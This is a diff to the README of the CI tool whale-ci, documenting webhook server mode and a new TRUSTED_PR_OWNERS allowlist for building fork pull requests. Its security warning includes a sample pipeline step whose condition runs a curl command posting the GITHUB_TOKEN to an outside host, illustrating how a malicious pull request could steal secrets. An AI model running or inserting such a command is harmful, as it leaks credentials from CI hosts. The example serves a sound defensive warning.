@@ -250,11 +250,19 @@ At the end, whether the test succeeded or not, all running containers are stoppe
 # Server mode (GitHub webhook backend)
 
 With `--serve`, whale-ci runs as a long-lived HTTP server that GitHub can call as
-a [push webhook](https://docs.github.com/webhooks). The webhook is served on
+a [webhook](https://docs.github.com/webhooks). The webhook is served on
 the `/webhook` path (configure GitHub's payload URL as
-`http://<host>:<port>/webhook`; `application/json` content type). Each accepted push is built and tested, and
+`http://<host>:<port>/webhook`; `application/json` content type). Each accepted commit is built and tested, and
 the result is reported back to GitHub as a commit status (so it shows up as a
 check on the commit and pull request).
+
+Subscribe the webhook to the **push** event. Pushes to branches in your own
+repository — including the branches behind your own pull requests — are built
+from that event alone. Pull requests opened from **forks** produce no push event
+in your repository, and are built only if you additionally subscribe to the
+**pull request** event and allowlist the fork's owner in `TRUSTED_PR_OWNERS`;
+see [Fork pull requests](#fork-pull-requests-trusted_pr_owners), which explains
+what you are trusting them with.
 
 The server also serves a small dashboard:
 
@@ -270,22 +278,24 @@ The server also serves a small dashboard:
 Requests to any other path get a `404`.
 
 The command must be run **from the root of a git checkout** that contains the
-named config file; it refuses to start otherwise. Because several pushes (to
+named config file; it refuses to start otherwise. Because several commits (on
 different branches) may be in flight at once, the server never builds in the
-serving checkout itself. Instead, for each push it:
+serving checkout itself. Instead, for each commit it:
 
 1. verifies the webhook's `X-Hub-Signature-256` against `WEBHOOK_SECRET`;
 2. posts a `pending` commit status (linking to the run's report page when
    `PUBLIC_URL` is set);
-3. fetches the pushed branch and adds a detached **git worktree**, under
-   `WORKTREE_ROOT`, checked out at the exact pushed commit;
+3. fetches the commit — the branch for a push, or `refs/pull/<n>/head` for a
+   fork pull request, whose head commit lives in the fork and is published in
+   your repository only under that ref — and adds a detached **git worktree**,
+   under `WORKTREE_ROOT`, checked out at the exact commit from the event;
 4. loads the config file from that worktree and runs the pipeline there,
    publishing the run's report (all steps pending) as it starts and rewriting it
    as each step finishes;
 5. posts a `success` or `failure` (or `error`) commit status; and
 6. removes the worktree.
 
-Using a separate worktree per push lets pushes to different branches be tested
+Using a separate worktree per run lets commits on different branches be tested
 concurrently without interfering with each other.
 
 The server is configured entirely through environment variables:
@@ -311,6 +321,13 @@ The server is configured entirely through environment variables:
   `target_url` of `<PUBLIC_URL>/runs/<id>`, so the **Details** link next to the
   check in the GitHub pull request opens that run's report page. When unset,
   statuses are posted without a link (unchanged behaviour).
+* `TRUSTED_PR_OWNERS` (optional): comma-separated GitHub account logins whose
+  **fork** pull requests are built, e.g. `alice,bob`. Compared
+  case-insensitively. Unset or empty — the default — builds no fork pull request
+  at all, and there is no wildcard. **Read
+  [Fork pull requests](#fork-pull-requests-trusted_pr_owners) before setting
+  this**: a fork pull request runs its author's code on this host, outside any
+  container.
 
 ```sh
 export GITHUB_TOKEN=ghp_...
@@ -318,12 +335,50 @@ export WEBHOOK_SECRET=$(openssl rand -hex 20)
 export WORKTREE_ROOT=/var/tmp/whale-ci
 export LISTEN_PORT=8080
 export PUBLIC_URL=https://ci.example.com   # optional; links checks to reports
+export TRUSTED_PR_OWNERS=alice,bob         # optional; see the warning below
 npx whale-ci --serve ci.yml
 ```
 
-`ping` events are answered, non-`push` events are ignored, and branch deletions
-and tag pushes are skipped. Press Ctrl-C to stop the server; it waits for any
-in-flight CI jobs to finish before exiting.
+`ping` events are answered and unrecognised events are ignored. Branch deletions
+and tag pushes are skipped. A `pull_request` event is built only on the
+`opened`, `synchronize` and `reopened` actions (the others leave the head commit
+unchanged), only from a fork whose owner is in `TRUSTED_PR_OWNERS`, and never
+when the pull request comes from a branch in the repository itself — that branch
+already produced a `push` event that built the same commit, and building both
+would run every such commit twice. Press Ctrl-C to stop the server; it waits for
+any in-flight CI jobs to finish before exiting.
+
+## Fork pull requests (`TRUSTED_PR_OWNERS`)
+
+Building a pull request means running the pipeline **as the contributor wrote
+it**: the config file comes from their branch, and a step's `only-if` condition
+and any `$(...)` push tag are executed with `bash -c` **on the host**, outside
+any container, as documented under
+[the configuration file](#configuration-file). A pull request that adds
+
+```yaml
+steps:
+  x:
+    image: alpine
+    only-if: curl -d "$GITHUB_TOKEN" https://example.com
+```
+
+runs that command on your CI machine as the service user. Restricting what the
+containers see does not help, because this never happens in a container: the
+service user can read `/etc/whale-ci.env` directly, and — being in the `docker`
+group, which is root-equivalent — can reach the whole host anyway.
+
+So **listing a login in `TRUSTED_PR_OWNERS` extends that person the same trust
+as push access to your repository.** It is not a sandbox, and it is not a way to
+safely accept pull requests from strangers. Use it only for people you would
+already give commit rights, and prefer simply giving them push access so their
+branches build from the `push` event with no fork involved. Note also that the
+allowlist names the fork's *owner*: anyone that owner grants push access to
+their fork can run code here too.
+
+Genuinely untrusted contributions need isolation this server does not provide —
+an ephemeral VM per run, holding no secrets and no docker group membership, with
+the status token held by a process the untrusted code cannot reach.
 
 ## Running as a systemd service
 
